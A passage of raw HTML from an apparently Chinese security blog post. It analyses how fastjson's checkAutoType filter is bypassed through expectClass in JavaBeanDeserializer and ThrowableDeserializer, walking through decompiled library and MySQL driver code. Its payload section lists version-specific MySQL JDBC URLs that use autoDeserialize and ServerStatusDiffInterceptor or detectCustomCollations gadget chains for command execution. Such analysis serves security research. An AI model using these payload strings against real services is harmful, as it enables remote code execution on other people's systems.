<span class="hljs-keyword">if</span> (h1 == -<span class="hljs-number">5808493101479473382L</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((h1 ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">h3</span> <span class="hljs-operator">=</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">2</span>)) * <span class="hljs-number">1099511628211L</span>;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">fullHash</span> <span class="hljs-operator">=</span> TypeUtils.fnv1a_64(className);<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">internalWhite</span> <span class="hljs-operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES, fullHash) &gt;= <span class="hljs-number">0</span>;<br>                <span class="hljs-type">long</span> hash;<br>                <span class="hljs-type">int</span> mask;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.internalDenyHashCodes != <span class="hljs-literal">null</span>) &#123;<br>                    hash = h3;<br><br>                    <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                        hash ^= (<span class="hljs-type">long</span>)className.charAt(mask);<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.internalDenyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                Class clazz;<br>                <span class="hljs-comment">//!internalWhite不为true  autoTypeSupport或expectClassFlag为true则进入</span><br>                <span class="hljs-keyword">if</span> (!internalWhite &amp;&amp; (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClassFlag)) &#123;<br>                    hash = h3;<br><br>                    <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                        hash ^= (<span class="hljs-type">long</span>)className.charAt(mask);<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span> &amp;&amp; Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, fullHash) &lt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><span class="hljs-comment">//从map中获取类</span><br>                clazz = TypeUtils.getClassFromMapping(typeName);<br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    clazz = <span class="hljs-built_in">this</span>.deserializers.findClass(typeName);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    clazz = (Class)<span class="hljs-built_in">this</span>.typeMapping.get(typeName);<br>                &#125;<br><span class="hljs-comment">//若在内部白名单中则加载类</span><br>                <span class="hljs-keyword">if</span> (internalWhite) &#123;<br>                    clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">//判断clazz不为HashMap且不为expectClass继承类，则返回类</span><br>                    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<span class="hljs-comment">//autoTypeSupport为false进入</span><br>                        hash = h3;<br><br>                        <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                            <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> className.charAt(mask);<br>                            hash ^= (<span class="hljs-type">long</span>)c;<br>                            hash *= <span class="hljs-number">1099511628211L</span>;<br>                            <span class="hljs-comment">//若在黑名单中报错</span><br>                            <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                            &#125;<br><span class="hljs-comment">//若在白名单中且为期望类则返回类</span><br>                            <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                                clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                                <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                                &#125;<br><br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">jsonType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-comment">//判断使用注解JSONType的类</span><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-string">&quot;.class&quot;</span>;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.defaultClassLoader != <span class="hljs-literal">null</span>) &#123;<br>                            is = <span class="hljs-built_in">this</span>.defaultClassLoader.getResourceAsStream(resource);<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (is != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">ClassReader</span> <span class="hljs-variable">classReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(is, <span class="hljs-literal">true</span>);<br>                            <span class="hljs-type">TypeCollector</span> <span class="hljs-variable">visitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeCollector</span>(<span class="hljs-string">&quot;&lt;clinit&gt;&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br>                            classReader.accept(visitor);<br>                            jsonType = visitor.hasJsonType();<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (Exception var28) &#123;<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        IOUtils.close(is);<br>                    &#125;<br><br>                    mask = Feature.SupportAutoType.mask;<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">autoTypeSupport</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeSupport || (features &amp; mask) != <span class="hljs-number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="hljs-number">0</span>;<br>                    <span class="hljs-comment">//若autoTypeSupport(开启autoType)  jsonType(使用JSONType注解)   expectClassFlag(有期望类且期望类符合条件)   其中有一个为true则进入</span><br>                    <span class="hljs-keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;<br>                        <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<span class="hljs-comment">//cacheClass 此处为false</span><br>                        <span class="hljs-comment">//classLoader不开启缓存加载类</span><br>                        clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, cacheClass);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//clazz 不为空进入</span><br>                        <span class="hljs-keyword">if</span> (jsonType) &#123;<span class="hljs-comment">//若jsonType为true则在map中添加类，后返回类</span><br>                            TypeUtils.addMapping(typeName, clazz);<br>                            <span class="hljs-keyword">return</span> clazz;<br>                        &#125;<br><br>                        <span class="hljs-comment">//若类为ClassLoader、DataSource、RowSet子类则抛出异常</span><br>                        <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz) || RowSet.class.isAssignableFrom(clazz)) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br><br>                        <span class="hljs-comment">//若期望类不为空且目标类为期望类子类则在map中添加类后返回类</span><br>                        <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>                                TypeUtils.addMapping(typeName, clazz);<br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br><br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                        &#125;<br><br>                        <span class="hljs-type">JavaBeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> JavaBeanInfo.build(clazz, clazz, <span class="hljs-built_in">this</span>.propertyNamingStrategy);<br>                        <span class="hljs-keyword">if</span> (beanInfo.creatorConstructor != <span class="hljs-literal">null</span> &amp;&amp; autoTypeSupport) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<span class="hljs-comment">//autoTypeSupport为false抛出异常</span><br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//autoTypeSupport为true则在map中添加类后返回类</span><br>                            TypeUtils.addMapping(typeName, clazz);<br>                        &#125;<br><br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当第一次进行checkAutoType()校验，传入expectClass为空，通过查找发现以下位置调用checkAutoType()</p><p><img src="/image/image-20220914163303120-16631443851911.png" alt="image-20220914163303120"></p><p>其中JavaBeanDeserializer#deserialze()和ThrowableDeserializer#deserialze()中调用的checkAutoType()均传入expectClass。JavaBeanDeserializer为默认反序列化器，ThrowableDeserializer为针对异常类的反序列化器</p><h6 id="2-JavaBeanDeserializer"><a href="#2-JavaBeanDeserializer" class="headerlink" title="2.JavaBeanDeserializer"></a>2.JavaBeanDeserializer</h6><p>第一次通过checkAutoType()检测后运行至</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializer(clazz);<br></code></pre></td></tr></table></figure><p>调用至ParserConfig#getDeserializer()，根据typeName获取对应反序列化器</p><p><img src="/image/image-20220915101030775-16632078323731.png" alt="image-20220915101030775"></p><p>最后调用至return new JavaBeanDeserializer(this, clazz, type);创建JavaBeanDeserializer 对象</p><p><img src="/image/image-20220915102116512-16632084784343.png" alt="image-20220915102116512"></p><p>获取反序列化器后运行相应反序列化器deserialze(this, clazz, fieldName)方法，deserializer为不同的反序列化器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> deserializer.deserialze(<span class="hljs-built_in">this</span>, clazz, fieldName);<br></code></pre></td></tr></table></figure><p>当调用JavaBeanDeserializer#deserialze(),type为clazz类全名</p><p><img src="/image/image-20220914173452845-16631480945763.png" alt="image-20220914173452845"></p><p>获取第二个@type值为typeName</p><p><img src="/image/image-20220914174838376-16631489201257.png" alt="image-20220914174838376"></p><p>将JSON串中第一个@type值为expectClass，第二个@type值为typeName进程checkAutoType()校验，若符合上述条件则可通过校验</p><p><img src="/image/image-20220914173711736-16631482335105.png" alt="image-20220914173711736"></p><p>通过校验后再次进行反序列化，进一步执行目标类set方法，从而执行恶意gadget</p><p><img src="/image/image-20220915113231225-16632127531165.png" alt="image-20220915113231225"></p><h6 id="3-ThrowableDeserializer"><a href="#3-ThrowableDeserializer" class="headerlink" title="3.ThrowableDeserializer"></a>3.ThrowableDeserializer</h6><p>与之前调用链相同，到达ThrowableDeserializer#deserialze() 前，对第一个@type指定的类进行了ParserConfig#checkAutoType()校验。若通过校验则进入到ThrowableDeserializer#deserialze()，词法分析器将继续遍历JSON字符串剩余的部分，如果下一个仍为@type，则将第二个@type值作为将校验类名称typeNmae，Throwable.class作为期望类expectClass，一同传入ParserConfig#checkAutoType()进行校验</p><p><img src="/image/image-20220915145950238-16632251916707.png" alt="image-20220915145950238"></p><p>通过校验后将再次进行反序列化，进一步执行目标类set方法，从而执行恶意gadget</p><p><img src="/image/image-20220915150716972-16632256384399.png" alt="image-20220915150716972"></p><p>故若需通过ThrowableDeserializer反序列化目标类，通过两次checkAutoType()校验，则需：</p><ol><li>第一个@type类为Throwable子类且在TypeUtils#mappings中</li><li>第二个@type类为Throwable子类</li></ol><p>因Throwable不在TypeUtils#mappings中，故可使用Throwable子类java.lang.Exception</p><h5 id="PAYLOAD-9"><a href="#PAYLOAD-9" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><h6 id="Gadget-1-命令执行"><a href="#Gadget-1-命令执行" class="headerlink" title="Gadget 1:命令执行"></a>Gadget 1:命令执行</h6><p>依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>x.x.xx<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>MySQL JDBC 反序列化链：</p><p>ServerStatusDiffInterceptor链</p><ul><li>5.1.0-5.1.10：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc  连接后需执行查询</li><li>5.1.11-5.x.xx：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>6.x：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc  （包名中添加cj）</li><li>8.0.20以下：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li></ul><p>detectCustomCollations链</p><ul><li>5.1.19-5.1.28：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.29-5.1.40：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.41 以上 不可用</li></ul><p>利用链简单分析：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">**queryInterceptors:**一个逗号分割的Class列表（实现了com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.interceptors</span>.QueryInterceptor接口的Class），在Query<span class="hljs-string">&quot;之间&quot;</span>进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）<br>**autoDeserialize:**自动检测与反序列化存在BLOB字段中的对象。<br></code></pre></td></tr></table></figure><p>detectCustomCollations链：</p><p>com.mysql.jdbc.ConnectionImpl#buildCollationMapping()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildCollationMapping</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>...<br>        <br>    <br>    <span class="hljs-keyword">if</span> (indexToCharset == <span class="hljs-literal">null</span>) &#123;<br>        indexToCharset = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//判断服务版本大于4.1.0且detectCustomCollations为true则进入</span><br>        <span class="hljs-comment">//5.1.28此处判断条件只有服务版本大于4.1.0</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">this</span>.getDetectCustomCollations()) &#123;<br>            java.sql.<span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">results</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                sortedCollationMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>();<br>                customCharset = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>                customMblen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>                stmt = <span class="hljs-built_in">this</span>.getMetadataSafeStatement();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">//执行&quot;SHOW COLLATION&quot; SQL语句</span><br>                    results = stmt.executeQuery(<span class="hljs-string">&quot;SHOW COLLATION&quot;</span>);<br>                    <span class="hljs-comment">//若服务版本大于5.0.0进入</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br>                        <span class="hljs-comment">//调用com.mysql.jdbc.Util#resultSetToMap()方法</span><br>                        Util.resultSetToMap(sortedCollationMap, results, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">while</span>(results.next()) &#123;<br>                            sortedCollationMap.put(results.getLong(<span class="hljs-number">3</span>), results.getString(<span class="hljs-number">2</span>));<br>                        &#125;<br>                    &#125;<br></code></pre></td></tr></table></figure><p>com.mysql.jdbc.Util#resultSetToMap()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resultSetToMap</span><span class="hljs-params">(Map mappedValues, ResultSet rs, <span class="hljs-type">int</span> key, <span class="hljs-type">int</span> value)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">while</span>(rs.next()) &#123;<br>        <span class="hljs-comment">//调用ResultSetImpl#getObject()方法</span><br>        mappedValues.put(rs.getObject(key), rs.getObject(value));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ResultSetImpl#getObject()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-type">int</span> columnIndex)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-built_in">this</span>.checkRowPos();<br>    <span class="hljs-built_in">this</span>.checkColumnBounds(columnIndex);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">columnIndexMinusOne</span> <span class="hljs-operator">=</span> columnIndex - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.thisRow.isNull(columnIndexMinusOne)) &#123;<br>        <span class="hljs-built_in">this</span>.wasNullFlag = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.wasNullFlag = <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.fields[columnIndexMinusOne];<br>        String stringVal;<br>        <span class="hljs-keyword">switch</span> (field.getSQLType()) &#123;<br>            <span class="hljs-keyword">case</span> -<span class="hljs-number">7</span>:<br>                <span class="hljs-keyword">if</span> (field.getMysqlType() == <span class="hljs-number">16</span> &amp;&amp; !field.isSingleBit()) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getObjectDeserializingIfNeeded(columnIndex);<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getBoolean(columnIndex);<br>            <span class="hljs-keyword">case</span> -<span class="hljs-number">6</span>:<br>                <span class="hljs-keyword">if</span> (!field.isUnsigned()) &#123;<br>                    <span class="hljs-keyword">return</span> Integer.valueOf(<span class="hljs-built_in">this</span>.getByte(columnIndex));<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getInt(columnIndex);<br>......<br>            <span class="hljs-keyword">case</span> -<span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">if</span> (field.getMysqlType() == <span class="hljs-number">255</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getBytes(columnIndex);<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getObjectDeserializingIfNeeded(columnIndex);<br>           ......<br></code></pre></td></tr></table></figure><p>ResultSetImpl#getObject()方法</p><ul><li>&lt;8.0.20: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>6.x(属性名不同): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.11及以上的5.x版本（包名没有了cj）: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc<br>detectCustomCollations触发：<br>5.1.41及以上: 不可用<br>5.1.29-5.1.40: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc<br>5.1.28-5.1.19： jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc<br>5.1.18以下的5.1.x版本： 不可用<br>5.0.x版本不可用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 